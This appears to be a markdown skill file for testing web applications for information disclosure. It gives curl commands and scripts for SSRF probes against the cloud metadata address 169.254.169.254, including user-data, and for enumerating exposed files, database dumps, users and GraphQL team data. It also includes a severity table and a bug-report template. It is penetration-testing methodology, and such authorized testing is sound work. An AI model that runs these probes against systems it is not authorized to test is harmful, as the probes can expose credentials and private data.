---
description: Find SECRETS vulnerabilities in web applications. Use when testing for SECRETS issues.
---

# SECRETS Vulnerability Testing

## High-Value Patterns from Real Reports

### Critical Endpoints
```bash
# Metadata service endpoints (SSRF)
169.254.169.254/latest/meta-data/hostname
169.254.169.254/latest/user-data

# Common exposure paths
/readme.html
/readme.txt
/mysql.initial.sql
/sidekiq
/_/api/1.0/invitation_request.json
/wp-content/plugins/*/readme.txt
```

### Parameter Names to Test
```
sig_gen, formName, formAction, author, p, shareToken, insp_pingurln
full_name, email, handle, uid, sid, w, nv
```

### Sensitive Headers
```
Server, X-ShopId, Proxy-Authorization, Authorization, Cookie
```

## Bash Commands for Discovery

### 1. Version Disclosure Detection
```bash
# Check server headers
curl -I "$TARGET" | grep -i "server:"

# Check for readme files
curl -s "$TARGET/readme.html" | grep -i "version\|v[0-9]"
curl -s "$TARGET/readme.txt" | grep -i "version\|v[0-9]"
curl -s "$TARGET/wp-content/plugins/all-in-one-seo-pack/readme.txt" | head -20
```

### 2. SSRF/Metadata Server Testing
```bash
# Test for SSRF via various parameters
for param in url redirect_uri callback next; do
    curl -X POST "$TARGET" -d "${param}=http://169.254.169.254/latest/meta-data/hostname" \
    --connect-timeout 5 -v 2>&1 | grep -E "(timeout|169\.254)"
done
```

### 3. Error Information Disclosure
```bash
# Trigger errors with duplicate parameters
curl -X POST "$TARGET/api/invitation_request.json" \
-d "email=test@test.com&full_name=1&full_name=2" | grep -E "(TypeError|Error|Exception|/home/|/var/)"

# Test parameter manipulation
curl "$TARGET?sig_gen=InvalidValue" | grep -E "(stack trace|error|exception|/[a-z]+/[a-z]+/)"
```

### 4. File Enumeration
```bash
# Test for exposed files
for file in mysql.initial.sql application.css config.json; do
    curl -s "$TARGET/$file" | head -5 | grep -v "404\|403\|Not Found"
done

# Test parameter enumeration
for i in {1..100}; do
    response=$(curl -s "$TARGET/?p=$i" -w "%{http_code}")
    if [[ $response != *"404"* ]]; then
        echo "Found: /?p=$i"
    fi
done
```

### 5. GraphQL Information Disclosure
```bash
# Test team information exposure
curl -X POST "$TARGET/graphql" \
-H "Content-Type: application/json" \
-d '{"query":"query {team(handle:\"TARGET_HANDLE\"){id,name,handle,whitelisted_hackers{total_count},vpn_suspended,vpn_enabled}}"}' \
| jq '.data.team'
```

## Step-by-Step Testing Methodology

### Phase 1: Reconnaissance
```bash
TARGET="https://example.com"

# 1. Identify server technology
curl -I "$TARGET" | grep -E "(Server|X-Powered-By|X-AspNet-Version)"

# 2. Check for common exposed files
for path in readme.html readme.txt mysql.initial.sql sidekiq; do
    echo "Testing: $TARGET/$path"
    curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path"
done

# 3. Look for CSS/JS source maps
curl -s "$TARGET" | grep -oE 'href="[^"]*\.css[^"]*"' | while read css; do
    css_url=$(echo $css | sed 's/href="//;s/"//')
    curl -s "$TARGET$css_url" | grep -oP "file.:.*?scss" | head -5
done
```

### Phase 2: Parameter Testing
```bash
# Test for user enumeration
for i in {1..10}; do
    curl -s "$TARGET/?author=$i" | grep -o "author-[a-zA-Z0-9]*" | head -1
done

# Test API endpoints with malformed data
curl -X POST "$TARGET/api/user/me" \
-d "param1=value1&param1=value2" \
-H "Content-Type: application/x-www-form-urlencoded" | grep -E "(Error|Exception|TypeError)"
```

### Phase 3: Header Analysis
```bash
# Check for proxy header leakage in redirects
curl -L -H "Proxy-Authorization: secret123" \
-H "X-Forwarded-For: 127.0.0.1" \
"$TARGET/redirect_endpoint" -v 2>&1 | grep -i "proxy-authorization"
```

### Phase 4: Deep File Analysis
```bash
# Download and analyze CSS for debug info
curl -s "$TARGET/assets/application.css" > app.css
grep -oP "file.:.*?scss" app.css | sort | uniq | head -10

# Check for exposed database files
curl -s "$TARGET/mysql.initial.sql" | grep -E "(CREATE TABLE|INSERT INTO)" | head -5
```

## Severity Rating Table

| Finding Type | Severity | Criteria |
|-------------|----------|----------|
| Metadata server access (169.254.169.254) | CRITICAL | Can access user-data with credentials |
| Full source code disclosure | CRITICAL | Application source or config exposed |
| Database schema/data exposure | HIGH | mysql.initial.sql or similar exposed |
| Stack traces with paths | MEDIUM | Error messages reveal file paths |
| Version disclosure | LOW | Server/application versions exposed |
| User enumeration | LOW-MEDIUM | Username discovery via author/ID params |

## False Positives to Ignore

### Expected Version Headers
```bash
# These are often intentional and low-risk
grep -v "nginx/1\." # Standard nginx versions
grep -v "Apache/2\." # Standard Apache versions
```

### Legitimate Error Messages
```bash
# Filter out client-side errors
grep -v "400 Bad Request"
grep -v "404 Not Found"
grep -v "403 Forbidden"
```

### Normal GraphQL Responses
```bash
# Ignore empty or null responses
jq 'select(.data != null and .data != {})'
```

## Finding Report Template

```markdown
## SECRETS Vulnerability: [Type]

### Summary
Brief description of the information disclosure vulnerability.

### Severity
[CRITICAL/HIGH/MEDIUM/LOW] - Based on type of information exposed

### Steps to Reproduce
1. Send request: `curl -X POST "$TARGET/endpoint" -d "param=value"`
2. Observe response containing sensitive information
3. Extract disclosed data: [specify what was found]

### Proof of Concept
```bash
# Command that demonstrates the issue
curl -s "$TARGET/vulnerable_endpoint" | grep -E "(sensitive_pattern)"
```

### Impact
- Information type exposed: [credentials/paths/versions/user data]
- Potential for further exploitation: [yes/no]
- Affected users/systems: [scope]

### Remediation
1. Remove sensitive information from responses
2. Implement proper error handling
3. Disable server version disclosure
4. Add authentication to sensitive endpoints

### Evidence
[Include relevant response snippets showing disclosed information]
```

## Quick Test Script

```bash
#!/bin/bash
TARGET="$1"
echo "Testing $TARGET for SECRETS vulnerabilities..."

# Version disclosure
echo "[+] Checking version disclosure..."
curl -I "$TARGET" 2>/dev/null | grep -i "server:"

# Metadata endpoints
echo "[+] Testing metadata endpoints..."
curl -s --connect-timeout 3 "$TARGET" -d "url=http://169.254.169.254/latest/meta-data/" | grep -i "hostname\|instance-id"

# Error disclosure  
echo "[+] Testing error disclosure..."
curl -s -X POST "$TARGET/api/test" -d "param=1&param=2" | grep -E "(Error|Exception|/[a-z]+/[a-z]+/)"

# File exposure
echo "[+] Testing file exposure..."
for file in readme.html mysql.initial.sql sidekiq; do
    if curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file" | grep -q "200"; then
        echo "Found: $TARGET/$file"
    fi
done
```